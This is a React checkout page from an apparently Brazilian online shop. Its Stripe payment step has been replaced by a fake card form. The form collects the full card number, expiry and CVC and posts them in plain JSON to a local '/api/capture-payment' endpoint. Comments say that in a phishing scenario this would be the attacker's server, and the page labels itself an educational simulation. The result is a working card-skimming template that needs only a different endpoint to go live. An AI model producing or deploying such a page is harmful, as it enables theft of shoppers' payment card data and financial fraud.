import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Check } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useCart } from "@/contexts/CartContext";
import Layout from "@/components/Layout";
import { useToast } from "@/hooks/use-toast";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/hooks/useAuth";

// REMOVIDO: Imports oficiais da Stripe
// import { loadStripe } from "@stripe/stripe-js";
// import { Elements, PaymentElement, useStripe, useElements } from "@stripe/react-stripe-js";

// REMOVIDO: Carrega a chave do .env e o promise do Stripe
// const stripePromise = loadStripe(import.meta.env.VITE_STRIPE_PUBLIC_KEY || "pk_test_sua_chave_aqui");

type Step = "identificacao" | "endereco" | "pagamento";
const steps: { key: Step; label: string }[] = [
  { key: "identificacao", label: "Identificação" },
  { key: "endereco", label: "Endereço" },
  { key: "pagamento", label: "Pagamento" },
];

// --- Sub-componente: O Formulário de Pagamento Falso ---
// Este componente agora simula a entrada de dados do cartão
const FakePaymentForm = ({ orderId, buyerName, buyerEmail, setLoading, onSuccess }: {
  orderId: string;
  buyerName: string;
  buyerEmail: string;
  setLoading: (loading: boolean) => void;
  onSuccess: () => void;
}) => {
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState(""); // Formato MM/YY
  const [cardCvc, setCardCvc] = useState("");
  const [errorMessage, setErrorMessage] = useState("");
  const { clearCart } = useCart();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setErrorMessage("");

    // Validação básica dos campos
    if (!cardNumber || !cardExpiry || !cardCvc) {
      setErrorMessage("Por favor, preencha todos os dados do cartão.");
      setLoading(false);
      return;
    }
    if (cardNumber.replace(/\D/g, '').length < 16) {
      setErrorMessage("Número do cartão inválido.");
      setLoading(false);
      return;
    }
    // Validação simples de expiração (ainda ano/mês)
    const [month, year] = cardExpiry.split('/').map(Number);
    const now = new Date();
    const currentYear = now.getFullYear() % 100; // Ano com 2 dígitos
    const currentMonth = now.getMonth() + 1;

    if (isNaN(month) || isNaN(year) || month < 1 || month > 12 || year < currentYear || (year === currentYear && month < currentMonth)) {
        setErrorMessage("Data de validade inválida ou expirada.");
        setLoading(false);
        return;
    }
    if (cardCvc.replace(/\D/g, '').length < 3) {
      setErrorMessage("CVC inválido.");
      setLoading(false);
      return;
    }

    try {
      // --- SIMULAÇÃO DE ENVIO PARA O BACKEND FALSO ---
      // Em um cenário de phishing, este seria o endpoint do atacante.
      // Aqui, vamos enviar para o nosso servidor Flask local (porta 5001).
      const response = await fetch('http://127.0.0.1:5001/api/capture-payment', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          order_id: orderId,
          buyer_name: buyerName,
          buyer_email: buyerEmail,
          card_number: cardNumber, // Enviando o número completo! (PERIGOSO E ILEGAL EM PRODUÇÃO!)
          card_expiry: cardExpiry,
          card_cvc: cardCvc,
          timestamp: new Date().toISOString(),
        }),
      });

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.message || "Erro ao processar pagamento no servidor simulado.");
      }

      // Se a requisição for bem-sucedida no backend simulado
      clearCart();
      onSuccess(); // Chama a função de sucesso passada para o componente pai

    } catch (error: any) {
      console.error("Erro no pagamento simulado:", error);
      setErrorMessage(error.message || "Ocorreu um erro inesperado. Tente novamente.");
      setLoading(false);
    }
  };

  // Formatação simples para número do cartão (ex: 1111 2222 3333 4444)
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '');
    let formattedValue = '';
    for (let i = 0; i < value.length; i++) {
      if (i > 0 && i % 4 === 0) {
        formattedValue += ' ';
      }
      formattedValue += value[i];
    }
    setCardNumber(formattedValue);
  };

  // Formatação simples para data de validade (ex: MM/YY)
  const handleCardExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '');
    let formattedValue = '';
    if (value.length > 2) {
      formattedValue = `${value.substring(0, 2)}/${value.substring(2, 4)}`;
    } else {
      formattedValue = value;
    }
    setCardExpiry(formattedValue);
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-6">
      {/* Campos de entrada de texto para dados do cartão */}
      <div>
        <label className="text-sm text-muted-foreground block mb-1">Número do Cartão</label>
        <Input
          type="text"
          value={cardNumber}
          onChange={handleCardNumberChange}
          placeholder="1111 2222 3333 4444"
          maxLength={19} // 16 dígitos + 3 espaços
          required
        />
      </div>
      <div className="grid grid-cols-2 gap-4">
        <div>
          <label className="text-sm text-muted-foreground block mb-1">Validade (MM/YY)</label>
          <Input
            type="text"
            value={cardExpiry}
            onChange={handleCardExpiryChange}
            placeholder="08/25"
            maxLength={5}
            required
          />
        </div>
        <div>
          <label className="text-sm text-muted-foreground block mb-1">CVC</label>
          <Input
            type="text"
            value={cardCvc}
            onChange={(e) => setCardCvc(e.target.value.replace(/\D/g, ''))}
            placeholder="123"
            maxLength={4}
            required
          />
        </div>
      </div>

      {errorMessage && <div className="text-red-500 text-sm font-medium">{errorMessage}</div>}

      <Button type="submit" disabled={!cardNumber || !cardExpiry || !cardCvc || (true /* Em produção, seria !stripe || isProcessing */)} className="w-full rounded-lg text-lg h-12">
        {/* Este botão agora envia os dados para o nosso backend simulado */}
        {"Processar Pagamento (Simulação)"}
      </Button>
    </form>
  );
};
// ----------------------------------------------

const Checkout = () => {
  const [currentStep, setCurrentStep] = useState<Step>("identificacao");
  const [loading, setLoading] = useState(false);
  const { items, subtotal, clearCart } = useCart(); // Adicionado clearCart aqui
  const { user } = useAuth();
  const { toast } = useToast();
  const navigate = useNavigate(); // Para redirecionar após sucesso

  const [name, setName] = useState("");
  const [email, setEmail] = useState(user?.email ?? "");
  const [phone, setPhone] = useState("");
  const [cpf, setCpf] = useState("");

  const [cep, setCep] = useState("");
  const [street, setStreet] = useState("");
  const [number, setNumber] = useState("");
  const [complement, setComplement] = useState("");
  const [neighborhood, setNeighborhood] = useState("");
  const [city, setCity] = useState("");
  const [state, setState] = useState("");

  // REMOVIDO: clientSecret e orderId do estado para o Stripe
  const [orderId, setOrderId] = useState(""); // Manteremos para o FakePaymentForm
  const [paymentSuccess, setPaymentSuccess] = useState(false); // Estado para indicar sucesso

  const formatPrice = (p: number) => p.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
  const currentIndex = steps.findIndex((s) => s.key === currentStep);

  const handlePaymentSuccess = () => {
    setPaymentSuccess(true); // Atualiza o estado para mostrar a mensagem de sucesso
    // Opcional: redirecionar para uma página de sucesso após alguns segundos
    setTimeout(() => {
      navigate("/checkout/success"); // Assumindo que você tem essa rota configurada
    }, 3000); // Redireciona após 3 segundos
  };

  const prepareOrderAndPayment = async () => {
    if (items.length === 0) {
      toast({ title: "Carrinho vazio", variant: "destructive" });
      return;
    }
    setLoading(true);

    // Cria o pedido no Supabase
    const { data: order, error: orderErr } = await supabase.from("orders").insert({
      user_id: user?.id ?? null,
      status: "pending", // Status inicial, pode ser atualizado posteriormente
      buyer_name: name,
      buyer_email: email,
      buyer_phone: phone,
      buyer_cpf: cpf,
      shipping_address: { cep, street, number, complement, neighborhood, city, state },
      subtotal: subtotal,
      shipping: 0, // Frete grátis fixo por enquanto
      total: subtotal, // Total igual ao subtotal por enquanto
    }).select().single();

    if (orderErr || !order) {
      console.error("Erro ao criar pedido no Supabase:", orderErr);
      setLoading(false);
      toast({ title: "Erro ao criar pedido", variant: "destructive" });
      return;
    }

    // Insere os itens do pedido
    const { error: itemsErr } = await supabase.from("order_items").insert(items.map((it) => ({
      order_id: order.id,
      product_id: it.product.id,
      product_name: it.product.name,
      product_image: it.product.image_url,
      unit_price: it.product.price,
      quantity: it.quantity,
    })));

    if (itemsErr) {
      console.error("Erro ao inserir itens do pedido:", itemsErr);
      setLoading(false);
      toast({ title: "Erro ao adicionar itens ao pedido", variant: "destructive" });
      // Opcional: deletar o pedido criado se os itens falharem
      return;
    }

    // Sucesso na criação do pedido e itens!
    setOrderId(order.id); // Define o ID do pedido para o FakePaymentForm
    setLoading(false);
    setCurrentStep("pagamento"); // Avança para a etapa de pagamento
  };

  return (
    <Layout>
      <div className="container mx-auto px-4 py-8 max-w-4xl">
        <div className="flex items-center justify-center gap-2 mb-8">
          {steps.map((s, i) => (
            <div key={s.key} className="flex items-center gap-2">
              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${i <= currentIndex ? "bg-primary text-primary-foreground" : "bg-muted text-muted-foreground"}`}>
                {i < currentIndex ? <Check className="h-4 w-4" /> : i + 1}
              </div>
              <span className={`text-sm hidden sm:inline ${i <= currentIndex ? "text-primary font-medium" : "text-muted-foreground"}`}>{s.label}</span>
              {i < steps.length - 1 && <div className={`w-8 h-0.5 ${i < currentIndex ? "bg-primary" : "bg-muted"}`} />}
            </div>
          ))}
        </div>

        <div className="grid lg:grid-cols-3 gap-8">
          <div className="lg:col-span-2">
            {currentStep === "identificacao" && (
              <div className="bg-card border border-border rounded-lg p-6 space-y-4">
                <h2 className="text-lg font-bold">Dados pessoais</h2>
                <div className="grid sm:grid-cols-2 gap-4">
                  <div><label className="text-sm text-muted-foreground block mb-1">Nome completo</label><Input value={name} onChange={(e) => setName(e.target.value)} required /></div>
                  <div><label className="text-sm text-muted-foreground block mb-1">E-mail</label><Input type="email" value={email} onChange={(e) => setEmail(e.target.value)} required /></div>
                  <div><label className="text-sm text-muted-foreground block mb-1">CPF</label><Input value={cpf} onChange={(e) => setCpf(e.target.value)} placeholder="Ex: 123.456.789-00" /></div>
                  <div><label className="text-sm text-muted-foreground block mb-1">Telefone</label><Input value={phone} onChange={(e) => setPhone(e.target.value)} placeholder="Ex: (11) 99999-9999" /></div>
                </div>
                <Button onClick={() => setCurrentStep("endereco")} disabled={!name || !email} className="w-full rounded-lg">Continuar</Button>
              </div>
            )}

            {currentStep === "endereco" && (
              <div className="bg-card border border-border rounded-lg p-6 space-y-4">
                <h2 className="text-lg font-bold">Endereço de entrega</h2>
                <div className="grid sm:grid-cols-2 gap-4">
                  <div><label className="text-sm text-muted-foreground block mb-1">CEP</label><Input value={cep} onChange={(e) => setCep(e.target.value)} placeholder="Ex: 00000-000" required /></div>
                  <div className="sm:col-span-2"><label className="text-sm text-muted-foreground block mb-1">Rua</label><Input value={street} onChange={(e) => setStreet(e.target.value)} required /></div>
                  <div><label className="text-sm text-muted-foreground block mb-1">Número</label><Input value={number} onChange={(e) => setNumber(e.target.value)} required /></div>
                  <div><label className="text-sm text-muted-foreground block mb-1">Complemento</label><Input value={complement} onChange={(e) => setComplement(e.target.value)} /></div>
                  <div><label className="text-sm text-muted-foreground block mb-1">Bairro</label><Input value={neighborhood} onChange={(e) => setNeighborhood(e.target.value)} required /></div>
                  <div><label className="text-sm text-muted-foreground block mb-1">Cidade</label><Input value={city} onChange={(e) => setCity(e.target.value)} required /></div>
                  <div><label className="text-sm text-muted-foreground block mb-1">Estado</label><Input value={state} onChange={(e) => setState(e.target.value)} placeholder="Ex: SP" required /></div>
                </div>
                <div className="flex gap-3">
                  <Button variant="outline" onClick={() => setCurrentStep("identificacao")} className="flex-1 rounded-lg">Voltar</Button>
                  <Button onClick={prepareOrderAndPayment} disabled={!cep || !street || !number || !city || !state || loading} className="flex-1 rounded-lg">
                    {loading ? "Processando..." : "Ir para Pagamento"}
                  </Button>
                </div>
              </div>
            )}

            {/* --- ETAPA DE PAGAMENTO MODIFICADA --- */}
            {currentStep === "pagamento" && orderId && !paymentSuccess && (
              <div className="bg-card border border-border rounded-lg p-6 space-y-6 shadow-sm">
                <div>
                  <h2 className="text-lg font-bold mb-1">Pagamento</h2>
                  <p className="text-sm text-muted-foreground">Por favor, insira os dados do seu cartão. (Simulação Educacional)</p>
                </div>

                {/* Aqui entra o formulário de pagamento FALSO */}
                <div className="border border-border rounded-lg p-4 bg-background">
                  {/* REMOVIDO: <Elements stripe={stripePromise} options={{ clientSecret }}> */}
                    <FakePaymentForm
                      orderId={orderId}
                      buyerName={name}
                      buyerEmail={email}
                      setLoading={setLoading}
                      onSuccess={handlePaymentSuccess}
                    />
                  {/* REMOVIDO: </Elements> */}
                </div>

                <Button variant="outline" onClick={() => setCurrentStep("endereco")} className="w-full rounded-lg">Voltar</Button>
              </div>
            )}

            {/* Mensagem de sucesso */}
            {paymentSuccess && (
              <div className="bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded relative text-center" role="alert">
                <strong className="font-bold">Pagamento Realizado com Sucesso (Simulação)!</strong>
                <p className="block sm:inline">Você será redirecionado para a página de confirmação em breve.</p>
              </div>
            )}
          </div>

          <div className="bg-card border border-border rounded-lg p-6 h-fit">
            <h3 className="font-bold mb-4">Resumo do pedido</h3>
            <div className="space-y-3 mb-4">
              {items.map((item) => (
                <div key={item.product.id} className="flex gap-3">
                  <img src={item.product.image_url ?? "/placeholder.svg"} alt="" className="w-12 h-12 rounded object-cover" />
                  <div className="flex-1 min-w-0">
                    <p className="text-xs line-clamp-2">{item.product.name}</p>
                    <p className="text-xs text-muted-foreground">Qtd: {item.quantity}</p>
                  </div>
                  <span className="text-sm font-medium whitespace-nowrap">{formatPrice(item.product.price * item.quantity)}</span>
                </div>
              ))}
            </div>
            <div className="border-t border-border pt-3 space-y-2">
              <div className="flex justify-between text-sm"><span>Subtotal</span><span>{formatPrice(subtotal)}</span></div>
              <div className="flex justify-between text-sm"><span>Frete</span><span className="text-primary font-medium">Grátis</span></div>
              <div className="flex justify-between font-bold text-lg border-t border-border pt-2"><span>Total</span><span className="text-primary">{formatPrice(subtotal)}</span></div>
            </div>
          </div>
        </div>
      </div>
    </Layout>
  );
};

export default Checkout;
